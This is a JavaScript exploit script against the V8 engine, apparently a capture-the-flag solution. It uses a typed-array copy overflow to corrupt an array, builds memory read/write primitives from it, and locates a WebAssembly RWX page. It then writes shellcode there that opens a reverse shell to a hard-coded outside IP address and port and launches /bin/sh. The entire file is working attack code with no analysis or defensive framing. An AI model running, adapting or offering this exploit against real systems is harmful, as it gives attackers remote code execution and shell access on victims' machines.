let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
BigInt.prototype.smi2f = function() {
    int_view[0] = this << 32n;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}
Number.prototype.f2smi = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}

Number.prototype.fhw = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}

Number.prototype.flw = function() {
    float_view[0] = this;
    return int_view[0] & BigInt(2**32-1);
}

Number.prototype.i2f = function() {
    return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
    return BigInt(this).smi2f();
}

function hex(a) {
    return a.toString(16);
}


var x = "sice"

//var overwrite_my_len = new Array(100);
var w = new Uint8Array(10);
var z = new Uint8Array(1000);

var sice_obj = {"a":0x100.smi2f(),"b":BigInt(0x13377331).i2f(),"c":BigInt(0x13377331).i2f(),"d":BigInt(0x13377331).i2f()}
var corrupt_me = [-1.1885960025192367e+148,1.1,1.1,1.1,1.1]
var float_carw  = [6.6]
var uint64_aarw = new BigUint64Array(4);
var obj_leaker ={      
	a: corrupt_me,
	b: corrupt_me,
};

const float_carw_elements_offset = 0x14;

z.fill(0x91,0,1000);
z[197] = 0x18;
z[196] = 0x91;
//%DebugPrint(sice_obj);


var offs = 6;

%TypedArrayCopyElements(w,z,198);
for(var i = 0x8000;i < 0x9000;i++){
	var tmp = sice_obj[i];
	console.log("Offset => "+hex(i)+ "; Val => "+hex(tmp.f2i()));
	if(tmp == -1.1885960025192367e+148){
		//console.log(hex(sice_obj[i+offs].f2i()))
		
		tmp = (0xff000000000n|(sice_obj[i+offs].flw())).i2f()
		console.log("swapping")

		//console.log("[!!!] FOUND @ Offset => "+hex(i)+ "; Val => "+hex(tmp.f2i()));
		sice_obj[i+offs] = tmp
		console.log(hex(sice_obj[i+offs].f2i()))
		break;
	}

}

console.log(corrupt_me.length)


// reads 4 bytes from the compressed heap at the specified dword offset after float_rel
function crel_read4(offset) {
    qw_offset = Math.floor(offset / 2);
    if (offset & 1 == 1) {
        return corrupt_me[qw_offset].fhw();
    } else {
        return corrupt_me[qw_offset].flw();
    }
}

function crel_write4(offset, val) {
    qw_offset = Math.floor(offset / 2);
    // we are writing an 8-byte double under the hood
    // read out the other half and keep its value
    if (offset & 1 == 1) {
        temp = corrupt_me[qw_offset].flw();
        new_val = (val << 32n | temp).i2f();
        corrupt_me[qw_offset] = new_val;
    } else {
        temp = corrupt_me[qw_offset].fhw();
        new_val = (temp << 32n | val).i2f();
        corrupt_me[qw_offset] = new_val;
    }
}

function cabs_read4(caddr) {
    elements_addr = caddr - 8n | 1n;
    crel_write4(float_carw_elements_offset, elements_addr);
    console.log('cabs_read4: ', hex(float_carw[0].f2i()));
    res = float_carw[0].flw();
    // TODO restore elements ptr
    return res;
}

function cabs_read8(caddr) {
    elements_addr = caddr - 8n | 1n;
    crel_write4(float_carw_elements_offset, elements_addr);
    console.log('cabs_read8: ', hex(float_carw[0].f2i()));
    res = float_carw[0].f2i();
    // TODO restore elements ptr
    return res;
}

function cabs_write4(caddr, val) {
    elements_addr = caddr - 8n | 1n;

    temp = cabs_read4(caddr + 4n | 1n);
    //console.log('cabs_write4 temp: ', hex(temp));

    new_val = (temp << 32n | val).i2f();

    crel_write4(float_carw_elements_offset, elements_addr);
    //console.log('cabs_write4 prev_val: ', hex(float_carw[0].f2i()));

    float_carw[0] = new_val;
    // TODO restore elements ptr
    return res;
}

const objleaker_offset = 0x41;
function addrof(o) {
    obj_leaker.b = o;
    addr = crel_read4(objleaker_offset) & BigInt(2**32-2);
    obj_leaker.b = {};
    return addr;
}

const uint64_externalptr_offset = 0x1b;     // in 8-bytes


function read8(addr) {
    faddr = addr.i2f();
    t1 = corrupt_me[uint64_externalptr_offset];
    t2 = corrupt_me[uint64_externalptr_offset + 1];
    corrupt_me[uint64_externalptr_offset] = faddr;
    corrupt_me[uint64_externalptr_offset + 1] = 0.0;

    val = uint64_aarw[0];

    corrupt_me[uint64_externalptr_offset] = t1;
    corrupt_me[uint64_externalptr_offset + 1] = t2;
    return val;
}

// Arbitrary write. We corrupt the backing store of the `uint64_aarw` array and then write into the array
function write8(addr, val) {
    faddr = addr.i2f();
    t1 = corrupt_me[uint64_externalptr_offset];
    t2 = corrupt_me[uint64_externalptr_offset + 1];
    corrupt_me[uint64_externalptr_offset] = faddr;
    corrupt_me[uint64_externalptr_offset + 1] = 0.0;

    uint64_aarw[0] = val;

    corrupt_me[uint64_externalptr_offset] = t1;
    corrupt_me[uint64_externalptr_offset + 1] = t2;
    return val;
}

// Given an array of bigints, this will write all the elements to the address provided as argument
function writeShellcode(addr, sc) {
    faddr = addr.i2f();
    t1 = corrupt_me[uint64_externalptr_offset];
    t2 = corrupt_me[uint64_externalptr_offset + 1];
    corrupt_me[uint64_externalptr_offset - 1] = 10;
    corrupt_me[uint64_externalptr_offset] = faddr;
    corrupt_me[uint64_externalptr_offset + 1] = 0.0;

    for (var i = 0; i < sc.length; ++i) {
        uint64_aarw[i] = sc[i]
    }

    corrupt_me[uint64_externalptr_offset] = t1;
    corrupt_me[uint64_externalptr_offset + 1] = t2;
}

var tmp = 0;

let previous_elements = crel_read4(0x14);
console.log(hex(previous_elements));
console.log(hex(cabs_read4(previous_elements)));
console.log(hex(cabs_read4(previous_elements + 4n)));
cabs_write4(previous_elements, 0x66554433n);
console.log(hex(cabs_read4(previous_elements)));
console.log(hex(cabs_read4(previous_elements + 4n)));

console.log('addrof(corrupt_me): ' + hex(addrof(corrupt_me)));
uint64_aarw[0] = 0x4142434445464748n;

function get_wasm_func() {
    var importObject = {
        imports: { imported_func: arg => console.log(arg) }
    };
    bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];
    wasm_code = new Uint8Array(bc);
    wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);
    return wasm_mod.exports.exported_func;
}

let wasm_func = get_wasm_func();
wfunc = wasm_func;
shellcode = unescape("%u296a%u9958%u026a%u6a5f%u5e01%u050f%u9748%ub948%u0002%u3a05%uc58a%uc085%u4851%ue689%u106a%u6a5a%u582a%u050f%u036a%u485e%uceff%u216a%u0f58%u7505%u6af6%u583b%u4899%u2fbb%u6962%u2f6e%u6873%u5300%u8948%u52e7%u4857%ue689%u050f")
//  traverse the JSFunction object chain to find the RWX WebAssembly code page
let wasm_func_addr = addrof(wasm_func);
let sfi = cabs_read4(wasm_func_addr + 12n) - 1n;
console.log('sfi: ' + hex(sfi));
let WasmExportedFunctionData = cabs_read4(sfi + 4n) - 1n;
console.log('WasmExportedFunctionData: ' + hex(WasmExportedFunctionData));

let instance = cabs_read4(WasmExportedFunctionData + 8n) - 1n;
console.log('instance: ' + hex(instance));

let rwx_addr = cabs_read8(instance + 0x68n);
//console.log('rwx_addr: ' + hex(rwx_addr));

// write the shellcode to the RWX page
while(shellcode.length % 4 != 0){
    shellcode += "\u9090";
}

let sc = [];

// convert the shellcode to BigInt
for (let i = 0; i < shellcode.length; i += 4) {
    sc.push(BigInt(shellcode.charCodeAt(i)) + BigInt(shellcode.charCodeAt(i + 1) * 0x10000) + BigInt(shellcode.charCodeAt(i + 2) * 0x100000000) + BigInt(shellcode.charCodeAt(i + 3) * 0x1000000000000));
}

writeShellcode(rwx_addr,sc);

//console.log('success');
wfunc();
